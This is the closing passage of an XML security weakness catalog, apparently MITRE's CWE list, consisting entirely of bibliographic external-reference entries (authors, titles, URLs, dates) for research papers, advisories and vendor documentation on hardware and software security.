      <External_Reference Reference_ID="REF-1075">
			<Author>Sergei Skorabogatov</Author>
			<Title>Security, Reliability, and Backdoors</Title>
			<URL>https://www.cl.cam.ac.uk/~sps32/SG_talk_SRB.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1081">
			<Author>Kit Murdock</Author>
			<Author>David Oswald</Author>
			<Author>Flavio D Garcia</Author>
			<Author>Jo Van Bulck</Author>
			<Author>Frank Piessens</Author>
			<Author>Daniel Gruss</Author>
			<Title>Plundervolt</Title>
			<URL>https://plundervolt.com/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1082">
			<Author>Adrian Tang</Author>
			<Author>Simha Sethumadhavan</Author>
			<Author>Salvatore Stolfo</Author>
			<Title>CLKSCREW: Exposing the Perils of Security-Oblivious Energy Management</Title>
			<URL>https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-tang.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1086">
			<Author>Fan Wang</Author>
			<Author>Vishwani D. Agrawal</Author>
			<Title>Single Event Upset: An Embedded Tutorial</Title>
			<URL>https://www.eng.auburn.edu/~agrawvd/TALKS/tutorial_6pg.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1087">
			<Author>P. D. Bradley</Author>
			<Author>E. Normand</Author>
			<Title>Single Event Upsets in Implantable Cardioverter Defibrillators</Title>
			<URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=736549&amp;tag=1</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1088">
			<Author>Melanie Berg</Author>
			<Author>Kenneth LaBel</Author>
			<Author>Jonathan Pellish</Author>
			<Title>Single Event Effects in FPGA Devices 2015-2016</Title>
			<URL>https://ntrs.nasa.gov/search.jsp?R=20160007754</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1089">
			<Author>Cisco</Author>
			<Title>Cisco 12000 Single Event Upset Failures Overview and Work Around Summary</Title>
			<URL>https://www.cisco.com/c/en/us/support/docs/field-notices/200/fn25994.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1090">
			<Author>Cypress</Author>
			<Title>Different Ways to Mitigate Soft Errors in Asynchronous SRAMs - KBA90939</Title>
			<URL>https://community.infineon.com/t5/Knowledge-Base-Articles/Different-Ways-to-Mitigate-Soft-Errors-in-Asynchronous-SRAMs-KBA90939/ta-p/257944</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1091">
			<Author>Ian Johnston</Author>
			<Title>Cosmic particles can change elections and cause plans to fall through the sky, scientists warn</Title>
			<URL>https://www.independent.co.uk/news/science/subatomic-particles-cosmic-rays-computers-change-elections-planes-autopilot-a7584616.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1092">
			<Author>Shahed E. Quadir</Author>
			<Author>Junlin Chen</Author>
			<Author>Domenic Forte</Author>
			<Author>Navid Asadizanjani</Author>
			<Author>Sina Shahbazmohamadi</Author>
			<Author>Lei Wang</Author>
			<Author>John Chandy</Author>
			<Author>Mark Tehranipoor</Author>
			<Title>A Survey on Chip to System Reverse Engineering</Title>
			<URL>https://dl.acm.org/doi/pdf/10.1145/2755563</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1097">
			<Author>Brian Krebs</Author>
			<Title>Zyxel Flaw Powers New Mirai IoT Botnet Strain</Title>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://krebsonsecurity.com/2020/03/zxyel-flaw-powers-new-mirai-iot-botnet-strain/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1101">
			<Author>Anders B. Wilhelmsen</Author>
			<Author>Eivind S. Kristiansen</Author>
			<Author>Marie Moe</Author>
			<Title>The Hard-coded Key to my Heart - Hacking a Pacemaker Programmer</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>https://anderbw.github.io/2019-08-10-DC27-Biohacking-pacemaker-programmer.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1109">
			<Title>LANGSEC: Language-theoretic Security</Title>
			<URL>http://langsec.org/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1110">
			<Title>LangSec: Recognition, Validation, and Compositional Correctness for Real World Security</Title>
			<URL>http://langsec.org/bof-handout.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1111">
			<Author>Sergey Bratus</Author>
			<Author>Lars Hermerschmidt</Author>
			<Author>Sven M. Hallberg</Author>
			<Author>Michael E. Locasto</Author>
			<Author>Falcon D. Momot</Author>
			<Author>Meredith L. Patterson</Author>
			<Author>Anna Shubina</Author>
			<Title>Curing the Vulnerable Parser: Design Patterns for Secure Input Handling</Title>
			<Publication>USENIX ;login:</Publication>
			<Publication_Year>2017</Publication_Year>
			<URL>https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1121">
			<Author>Moritz Lipp</Author>
			<Author>Michael Schwarz</Author>
			<Author>Daniel Gruss</Author>
			<Author>Thomas Prescher</Author>
			<Author>Werner Haas</Author>
			<Author>Anders Fogh</Author>
			<Author>Jann Horn</Author>
			<Author>Stegfan Mangard</Author>
			<Author>Paul Kocher</Author>
			<Author>Daniel Genkin</Author>
			<Author>Yuval Yarom</Author>
			<Author>Mike Hamberg</Author>
			<Title>Meltdown: Reading Kernel Memory from User Space</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>https://meltdownattack.com/meltdown.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1122">
			<Author>Moritz Lipp</Author>
			<Author>Michael Schwarz</Author>
			<Author>Daniel Gruss</Author>
			<Author>Thomas Prescher</Author>
			<Author>Werner Haas</Author>
			<Author>Anders Fogh</Author>
			<Author>Jann Horn</Author>
			<Author>Stegfan Mangard</Author>
			<Author>Paul Kocher</Author>
			<Author>Daniel Genkin</Author>
			<Author>Yuval Yarom</Author>
			<Author>Mike Hamberg</Author>
			<Title>Spectre Attacks: Exploiting Speculative Execution</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>https://spectreattack.com/spectre.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1123">
			<Author>Dmitry Evtyushkin</Author>
			<Author>Dmitry Ponomarev</Author>
			<Author>Nael Abu-Ghazaleh</Author>
			<Title>Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<URL>https://ieeexplore.ieee.org/abstract/document/7783743/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1124">
			<Author>Qian Ge</Author>
			<Author>Yuval Yarom</Author>
			<Author>David Cock</Author>
			<Author>Gernot Heiser</Author>
			<Title>A Survey of Microarchitectural Timing Attacks and Countermeasures on Contemporary Hardware</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<URL>https://eprint.iacr.org/2016/613.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1129">
			<Author>Christopher Tarnovsky</Author>
			<Title>Security Failures In Secure Devices</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---21</Publication_Day>
			<URL>https://www.blackhat.com/presentations/bh-dc-08/Tarnovsky/Presentation/bh-dc-08-tarnovsky.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1138">
			<Author>Stewart Smith</Author>
			<Title>CVE-2019-6260: Gaining control of BMC from the host processor</Title>
			<Publication_Year>2019</Publication_Year>
			<URL>https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1156">
			<Author>Leonid Grustniy</Author>
			<Title>Loapi--This Trojan is hot!</Title>
			<Publication_Year>2017</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<URL>https://www.kaspersky.com/blog/loapi-trojan/20510/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1161">
			<Author>Josep Balasch</Author>
			<Author>Benedikt Gierlichs</Author>
			<Author>Ingrid Verbauwhede</Author>
			<Title>An In-depth and Black-box Characterization of the Effects of Clock Glitches on 8-bit MCUs</Title>
			<Publication>2011 Workshop on Fault Diagnosis and Tolerance in Cryptography (IEEE)</Publication>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>https://ieeexplore.ieee.org/document/6076473</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1171">
			<Author>Matthew Green</Author>
			<Title>Why IND-CPA implies randomized encryption</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<URL>https://blog.cryptographyengineering.com/why-ind-cpa-implies-randomized-encryption/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1172">
			<Author>NIST</Author>
			<Title>Recommendation for Block Cipher Modes of Operation</Title>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<URL>https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1181">
			<Author>Nikolaos Athanasios Anagnostopoulos</Author>
			<Author>Tolga Arul</Author>
			<Author>Markus Rosenstihl</Author>
			<Author>André Schaller</Author>
			<Author>Sebastian Gabmeyer</Author>
			<Author>Stefan Katzenbeisser</Author>
			<Title>Low-Temperature Data Remnanence Attacks Against Intrinsic SRAM PUFs</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://ieeexplore.ieee.org/abstract/document/8491873/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1182">
			<Author>Yuan Cao</Author>
			<Author>Yunyi Guo</Author>
			<Author>Benyu Liu</Author>
			<Author>Wei Ge</Author>
			<Author>Min Zhu</Author>
			<Author>Chip-Hong Chang</Author>
			<Title>A Fully Digital Physical Unclonable Function Based Temperature Sensor for Secure Remote Sensing</Title>
			<Publication_Year>2018</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://ieeexplore.ieee.org/abstract/document/8487347/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1183">
			<Author> Urbi Chatterjee</Author>
			<Author> Soumi Chatterjee</Author>
			<Author> Debdeep Mukhopadhyay</Author>
			<Author> Rajat Subhra Chakraborty</Author>
			<Title>Machine Learning Assisted PUF Calibration for Trustworthy Proof of Sensor Data in IoT</Title>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<URL>https://dl.acm.org/doi/abs/10.1145/3393628</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1192">
			<Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
			<Title>FIPS PUB 140-3: SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://csrc.nist.gov/publications/detail/fips/140/3/final</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1197">
			<Author>Health Care Industry Cybersecurity Task Force</Author>
			<Title>Report on Improving Cybersecurity in the
			Health Care Industry</Title>
			<Publication_Year>2017</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<URL>https://www.phe.gov/Preparedness/planning/CyberTF/Documents/report2017.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1212">
			<Title>A06:2021 - Vulnerable and Outdated Components</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>OWASP</Publisher>
			<URL>https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1217">
			<Author>Ross Anderson</Author>
			<Title>Security Engineering</Title>
			<Publication_Year>2001</Publication_Year>
			<URL>https://www.cl.cam.ac.uk/~rja14/musicfiles/manuscripts/SEv1.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1222">
			<Author>Alexandre Menu</Author>
			<Author>Jean-Max Dutertre</Author>
			<Author>Olivier Potin</Author>
			<Author>Jean-Baptiste Rigaud</Author>
			<Title>Experimental Analysis of the Electromagnetic Instruction Skip Fault Model</Title>
			<Publication>IEEE Xplore</Publication>
			<Publication_Year>2020</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<URL>https://ieeexplore.ieee.org/document/9081261</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1223">
			<Author>Niek Timmers</Author>
			<Author>Albert Spruyt</Author>
			<Author>Marc Witteman</Author>
			<Title>Controlling PC on ARM using Fault Injection</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://fdtc.deib.polimi.it/FDTC16/shared/FDTC-2016-session_2_1.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1224">
			<Author>Colin O'Flynn</Author>
			<Title>Attacking USB Gear with EMFI</Title>
			<Publication>Circuit Cellar</Publication>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<URL>https://www.totalphase.com/media/pdf/whitepapers/Circuit_Cellar_TP.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1237">
			<Author>CERT Coordination Center</Author>
			<Title>Intel BIOS locking mechanism contains race condition that enables write protection bypass</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://www.kb.cert.org/vuls/id/766164/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1246">
			<Author>National Telecommunications and Information Administration</Author>
			<Title>SOFTWARE BILL OF MATERIALS</Title>
			<URL>https://ntia.gov/page/software-bill-materials</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1247">
			<Author>NTIA Multistakeholder Process on Software Component Transparency Framing Working Group</Author>
			<Title>Framing Software Component Transparency: Establishing a Common Software Bill of Materials (SBOM)</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---21</Publication_Day>
			<URL>https://www.ntia.gov/files/ntia/publications/ntia_sbom_framing_2nd_edition_20211021.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1248">
			<Author>Securing Energy Infrastructure Executive Task Force (SEI ETF)</Author>
			<Title>Categories of Security Vulnerabilities in ICS</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>https://inl.gov/wp-content/uploads/2022/03/SEI-ETF-NCSV-TPT-Categories-of-Security-Vulnerabilities-ICS-v1_03-09-22.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1254">
			<Author>FDA</Author>
			<Title>Cybersecurity in Medical Devices: Quality System Considerations and Content of Premarket Submissions Draft Guidance for Industry and Food and Drug Administration Staff (DRAFT GUIDANCE)</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>https://www.fda.gov/media/119933/download</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1255">
			<Author>Sergei P. Skorobogatov</Author>
			<Title>Semi-invasive attacks - A new approach to hardware security analysis</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<URL>https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-630.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1258">
			<Author>Wikipedia</Author>
			<Title>Random early detection</Title>
			<URL>https://en.wikipedia.org/wiki/Random_early_detection</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1259">
			<Author>Wikipedia</Author>
			<Title>Transport Layer Security</Title>
			<URL>https://en.wikipedia.org/wiki/Transport_Layer_Security</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1260">
			<Author>Thu T. Pham</Author>
			<Title>The Great DNS Vulnerability of 2008 by Dan Kaminsky</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://duo.com/blog/the-great-dns-vulnerability-of-2008-by-dan-kaminsky</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1261">
			<Author>Sam Weber</Author>
			<Author>Paul A. Karger</Author>
			<Author>Amit Paradkar</Author>
			<Title>A Software Flaw Taxonomy: Aiming Tools At Security</Title>
			<Publication_Year>2005</Publication_Year>
			<URL>https://cwe.mitre.org/documents/sources/ASoftwareFlawTaxonomy-AimingToolsatSecurity%5BWeber,Karger,Paradkar%5D.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1283">
			<Author>Forescout Vedere Labs</Author>
			<Title>OT:ICEFALL: The legacy of "insecure by design" and its implications for certifications and risk management</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.forescout.com/resources/ot-icefall-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1285">
			<Author>Texas Instruments</Author>
			<Title>Physical Security Attacks Against Silicon Devices</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---31</Publication_Day>
			<URL>https://www.ti.com/lit/an/swra739/swra739.pdf?ts=1644234570420</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1286">
			<Author>Lennert Wouters</Author>
			<Author>Benedikt Gierlichs</Author>
			<Author>Bart Preneel</Author>
			<Title>On The Susceptibility of Texas Instruments SimpleLink Platform Microcontrollers to Non-Invasive Physical Attacks</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://eprint.iacr.org/2022/328.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1287">
			<Author>MITRE</Author>
			<Title>Supplemental Details - 2022 CWE Top 25</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1295">
			<Author>WizCase</Author>
			<Title>Over 80 US Municipalities' Sensitive Information, Including Resident's Personal Data, Left Vulnerable in Massive Data Breach</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.wizcase.com/blog/us-municipality-breach-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1296">
			<Author>Jonathan Greig</Author>
			<Title>1,000 GB of local government data exposed by Massachusetts software company</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://www.zdnet.com/article/1000-gb-of-local-government-data-exposed-by-massachusetts-software-company/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1297">
			<Author>Amazon</Author>
			<Title>AWS Foundational Security Best Practices controls</Title>
			<Publication_Year>2022</Publication_Year>
			<URL>https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-controls-reference.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1298">
			<Author>Microsoft</Author>
			<Title>Authentication and authorization in Azure App Service and Azure Functions</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/app-service/overview-authentication-authorization</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1299">
			<Author>Microsoft</Author>
			<Title>Azure encryption overview</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/security/fundamentals/encryption-overview</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1301">
			<Author>Google Cloud</Author>
			<Title>Default encryption at rest</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://cloud.google.com/docs/security/encryption/default-encryption</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1302">
			<Author>Google Cloud</Author>
			<Title>Authentication and authorization use cases</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://cloud.google.com/docs/authentication/use-cases</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1303">
			<Author>Kelly Jackson Higgins</Author>
			<Title>Researchers Out Default Passwords Packaged With ICS/SCADA Wares</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<URL>https://www.darkreading.com/endpoint/researchers-out-default-passwords-packaged-with-ics-scada-wares</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1307">
			<Author>Center for Internet Security</Author>
			<Title>CIS Microsoft Azure Foundations Benchmark version 1.5.0</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>https://www.cisecurity.org/benchmark/azure</URL>
			<URL_Date>2023-01-19</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1309">
			<Author>Microsoft</Author>
			<Title>Require secure transfer to ensure secure connections</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer</URL>
			<URL_Date>2023-01-24</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1310">
			<Author>Microsoft</Author>
			<Title>Enable infrastructure encryption for double encryption of data</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable</URL>
			<URL_Date>2023-01-24</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1332">
			<Author>John Richard Moser</Author>
			<Title>Prelink and address space randomization</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://lwn.net/Articles/190139/</URL>
			<URL_Date>2023-04-26</URL_Date>
			</External_Reference>
      <External_Reference Reference_ID="REF-1333">
			<Author>Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh</Author>
			<Title>Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</Title>
			<Publication_Year>2016</Publication_Year>
			<URL>http://www.cs.ucr.edu/~nael/pubs/micro16.pdf</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1334">
			<Author>D3FEND</Author>
			<Title>Stack Frame Canary Validation (D3-SFCV)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1335">
			<Author>D3FEND</Author>
			<Title>Segment Address Offset Randomization (D3-SAOR)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1336">
			<Author>D3FEND</Author>
			<Title>Process Segment Execution Prevention (D3-PSEP)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1337">
			<Author>Alexander Sotirov and Mark Dowd</Author>
			<Title>Bypassing Browser Memory Protections: Setting back browser security by 10 years</Title>
			<Publication_Year>2008</Publication_Year>
			<URL>https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1350">
			<Title>reglk_wrapper.sv</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/blob/b9ecdf6068445d76d6bee692d163fededf7a9d9b/piton/design/chip/tile/ariane/src/reglk/reglk_wrapper.sv#L80C1-L80C48</URL>
			<URL_Date>2023-09-18</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1351">
			<Title>fix cwe 1199 in reglk</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/commit/5928add42895b57341ae8fc1f9b8351c35aed865#diff-1c2b09dd092a56e5fb2be431a3849e72ff489d2ae4f4a6bb9c0ea6b7d450135aR80</URL>
			<URL_Date>2023-09-18</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1358">
			<Title>hmac_wrapper.sv</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/blob/main/piton/design/chip/tile/ariane/src/hmac/hmac_wrapper.sv#L41</URL>
			<URL_Date>2023-07-15</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1359">
			<Title>HMAC HWIP Technical Specification</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://opentitan.org/book/hw/ip/hmac/</URL>
			<URL_Date>2023-10-05</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1384">
			<Title>The RISC-V Instruction Set Manual Volume II: Privileged Architecture page 28</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://riscv.org/wp-content/uploads/2017/05/riscv-privileged-v1.10.pdf</URL>
			<URL_Date>2024-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1385">
			<Title>csr_regfile.sv</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/blob/b9ecdf6068445d76d6bee692d163fededf7a9d9b/piton/design/chip/tile/ariane/src/csr_regfile.sv</URL>
			<URL_Date>2024-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1386">
			<Title>Fix for csr_regfile.sv</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/blob/2341c625a28d2fb87d370e32c45b68bd711cc43b/piton/design/chip/tile/ariane/src/csr_regfile.sv#L519C4-L522C20</URL>
			<URL_Date>2024-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1387">
			<Title>dmi_jtag.sv line 324</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/blob/main/piton/design/chip/tile/ariane/src/riscv-dbg/src/dmi_jtag.sv#L324C9-L324C87</URL>
			<URL_Date>2024-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1388">
			<Title>Fix for dmi_jtag.sv</Title>
			<Publication_Year>2021</Publication_Year>
			<URL>https://github.com/HACK-EVENT/hackatdac21/commit/c94ce5f9487a41c77ede0bbc8daf4da66c39f42a</URL>
			<URL_Date>2024-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1446">
		  <Author>Cybersecurity and Infrastructure Security Agency</Author>
		  <Title>Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords</Title>
		  <Publication_Year>2023</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <URL>https://www.cisa.gov/resources-tools/resources/secure-design-alert-how-manufacturers-can-protect-customers-eliminating-default-passwords</URL>
		  <URL_Date>2024-07-14</URL_Date>
		</External_Reference>
   </External_References>
</Weakness_Catalog>